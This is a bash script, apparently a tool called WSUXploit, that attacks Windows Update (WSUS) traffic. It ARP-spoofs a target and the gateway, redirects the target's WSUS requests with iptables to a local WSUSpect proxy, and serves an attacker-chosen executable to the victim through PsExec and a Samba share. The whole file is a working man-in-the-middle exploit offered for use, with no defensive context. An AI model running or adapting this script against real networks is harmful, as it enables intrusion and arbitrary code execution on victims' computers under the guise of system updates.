#!/bin/bash

cat << EOF
 __      __  _____________ _______  ___      .__         .__  __   
/  \    /  \/   _____/    |   \   \/  /_____ |  |   ____ |__|/  |_ 
\   \/\/   /\_____  \|    |   /\     /\____ \|  |  /  _ \|  \   __\ 
 \        / /        \    |  / /     \|  |_> >  |_(  <_> )  ||  |  
  \__/\  / /_______  /______/ /___/\  \   __/|____/\____/|__||__|  
       \/          \/               \_/__|                         by pimps

EOF

if [ "$(id -u)" != "0" ]; then
    echo "This script must run as root" 1>&2
    exit 1
fi

if [ "$#" -ne 4 ]; then
    cat << EOF
Usage:
$0 <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>

Example:
$0 192.168.0.101 10.0.0.85 80 /tmp/payload.exe

EOF
    exit 1
fi

for com in arpspoof iptables python; do
    command -v "$com" >/dev/null 2>&1 || {
        echo >&2 "$com required, but it's not installed. Aborting."
        exit 1
    }
done

VICTIM_IP="$1"
WSUS_IP="$2"
WSUS_PORT="$3"
BINARY_PATH="$4"
IFACE=$(ip route | awk '/default/ { print $5 }')
GATEWAY_IP=$(/sbin/ip route | awk '/default/ { print $3 }')
IPADDR=`ifconfig $IFACE 2> /dev/null|awk '/inet / {print $2}'`

IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

build () {
	echo "[*] Preparing exploit files..."
	rm -rf /tmp/payloads >/dev/null 2>&1
	mkdir /tmp/payloads >/dev/null 2>&1
	cp $BINARY_PATH /tmp/payloads/install.exe >/dev/null 2>&1
	cp $SCRIPT_DIR/resources/smb.conf /etc/samba/.
	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/script.bgi > /tmp/payloads/script.bgi
	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/script.vbs > /tmp/payloads/script.vbs
	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/payloads.ini > $SCRIPT_DIR/wsuspect-proxy/payloads/payloads.ini
        cp $SCRIPT_DIR/resources/BgInfo.exe $SCRIPT_DIR/wsuspect-proxy/payloads/.
	cp $SCRIPT_DIR/resources/PsExec.exe $SCRIPT_DIR/wsuspect-proxy/payloads/.
	chmod -R 777 /tmp/payloads/*
	service smbd restart
}

set_iptables () {
    local DEL_ADD="$1"
    iptables -t nat -"$DEL_ADD" PREROUTING -i "$IFACE" -p tcp -m tcp -s "$VICTIM_IP" \
    	-d "$WSUS_IP" --dport "$WSUS_PORT" -j REDIRECT --to-port 9090
}

function finish {
    echo "[*] Cleaning up..."
    set_iptables D 2> /dev/null 1>&2
    printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
    kill $ARP_PID_1 2> /dev/null 1>&2
    kill $ARP_PID_2 2> /dev/null 1>&2
    pkill -P $$
    echo "[*] Done."
}
trap finish EXIT

build

echo "[*] Spoofing arp replies..."

arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY_IP" 2>/dev/null 1>&2 &
ARP_PID_1=$!
arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$VICTIM_IP" 2>/dev/null 1>&2 &
ARP_PID_2=$!

echo "[*] Turning on IP forwarding..."

echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Set iptables rules for SYN packets..."

set_iptables A 2> /dev/null 1>&2

echo "[*] Running WSUSpect proxy..."
cd $SCRIPT_DIR/wsuspect-proxy
python wsuspect_proxy.py psexec 9090
